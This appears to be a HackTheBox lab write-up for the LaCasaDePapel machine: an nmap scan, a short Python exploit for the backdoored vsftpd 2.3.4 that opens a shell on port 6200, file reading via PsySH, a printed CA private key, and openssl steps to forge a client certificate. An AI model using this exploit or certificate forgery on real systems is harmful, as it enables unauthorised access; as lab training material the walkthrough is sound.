---
layout: post
title: "HTB - LaCasaDePapel"
author: "mrs3c"
categories: Blog
tags: [hackthebox, htb, pen-testing, certificates, cronjob, nodejs, openssl, otp, php, psysh, ssh rsa auth, ssh, vsftpd]
---
# Ippsec Video (click below)
[![LaCasaDePapel video](https://mrjak3.github.io/assets/img/lacasa_logo.png)](https://www.youtube.com/watch?v=OSRCEOQQJ4E)

## Summary

Fill out later

## 1. discovery - network service scanning - nmap

```python
# Nmap 7.80 scan initiated Sun Dec  8 21:59:21 2019 as: nmap -sC -sV -Pn -oA nmap/lacasadepapel 10.10.10.131
Nmap scan report for 10.10.10.131
Host is up (0.42s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE  VERSION
21/tcp  open  ftp      vsftpd 2.3.4
22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
| ssh-hostkey:
|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
80/tcp  open  http     Node.js (Express middleware)
|_http-title: La Casa De Papel
443/tcp open  ssl/http Node.js Express framework
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: La Casa De Papel
| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel
| Not valid before: 2019-01-27T08:35:30
|_Not valid after:  2029-01-24T08:35:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
| tls-nextprotoneg:
|   http/1.1
|_  http/1.0
Service Info: OS: Unix
```

## 2. discovery - files and directories - http

 ### 2.1 Navigating to port 80 we find a page which needs an OTP supplied by a QRCode. The page asks us to install Google Authenticator

![discovery_http](https://mrjak3.github.io/assets/img/htb-lacasadepapel-2_http.png)

 ### 2.2 Scanning the code using Google Authenticator on an Android phone gives us a code but it refuses to work either way. So, maybe its for internal users only. Lets keep this aside and come back later.

## 3. discovery - files and directories - https

### 3.1 Browsing to HTTPS shows us an error that we need a client certificate to continue which we don't possess at the moment

![discovery_https](https://mrjak3.github.io/assets/img/htb-lacasadepapel-3_https.png)

## 4. initial access - exploit public facing application - vsftp

### 4.1 As seen from nmap, vsftp is version 2.3.4. A quick search allows the attacker to discover that the version was backdoored. Lets try to replicate the exploit code.

### 4.2 The code just tries a failed login, which triggers the backdoor on port 6200 and then executes commands from it. Lets do that using a small python script:

```python
import socket
import os
import time

def exploit(ip, port):
    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((ip, port))

    sock.send('USER :)\n')
    sock.send('PASS HTBPASS\n')
    time.sleep(2)
    sock.close()

    os.system("rlwrap nc 10.10.10.131 6200 -v")

exploit("10.10.10.131", 21)
```

### 4.3 The code is pretty simple, it just creates a connection to the FTP port, sends in commands and then quiclky connects to the backdoored port at 6200.

### 4.4 Running the script:

 ![exploit_vsftp](https://mrjak3.github.io/assets/img/htb-lacasadepapel-4.4_vsftp.png)

## 5. Psy shell

### 5.1 Lets try executing system commands using the `cmd` operator

### 5.2 We find that shell_exec is disabled which prevents us from executing system commands. However, we can still list directories and read files using `scandir()` and `file_get_contents()`

![5.2.1](https://mrjak3.github.io/assets/img/htb-lacasadepapel-5.2.1.png)
![5.2.2](https://mrjak3.github.io/assets/img/htb-lacasadepapel-5.2.2.png)

### 5.3 We already know that we need a client certificate to access the service on HTTPS. In order to create one we need the CA certificate. Let's find it.

### 5.4 Looking at the home folders of the users we see five users.

![5.4](https://mrjak3.github.io/assets/img/htb-lacasadepapel-5.4.png)

### 5.5 Let's inspect each one of them. After some enumeration we see `ca.key` in ``/home/nairobi`

## 6.0 Private key CA certificates

### 6.1 Lets read its contents and copy it into a file

```
echo file_get_contents("/home/nairobi/ca.key")

-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb
7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/
2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl
uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M
YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp
s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us
PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V
Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89
1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ
/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+
q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr
uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd
I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og
7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE
G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn
sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH
CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y
sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI
ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2
zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/
ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC
9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M
WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM
7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR
aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc
53udBEzjt3WPqYGkkDknVhjD
-----END PRIVATE KEY-----```

## 7.0 Creating client certificate

### 7.1 Now that we have the CA certificate let's create a client certificate for ourselves. To create it first download the server certificate.

#### 7.1.1 Navigate to https://10.10.10.13
#### 7.1.2 then click on the lock icon on the URL bar.
#### 7.1.3 Then "Connection > More Information > View Certificate. Then in the popup window click on Details > Export"
#### 7.1.4 Export and save to folder

### 7.2 Then follow these steps to create the certificate:

#### 7.2.1 `openssl genrsa -out client.key 4096`
#### 7.2.2 `openssl req -new -key client.key -out client.req`
#### 7.2.3 `openssl x509 -req -in client.req -CA lacasadepapelhtb.crt -CAkey ca.key -set_serial 101 -extensions client -days 365 -outform PEM -out client.cer`
#### 7.2.4 `openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12 rm client.key client.req client.cer`

### 7.3 Now upload the client.p12 to the browser's store. In Firefox, go to Preferences > Privacy & Security > View Certificates. Then in the Your Certificates section click on Import and import the cert.

![7.3](https://mrjak3.github.io/assets/img/htb-lacasadepapel_7.3.png)
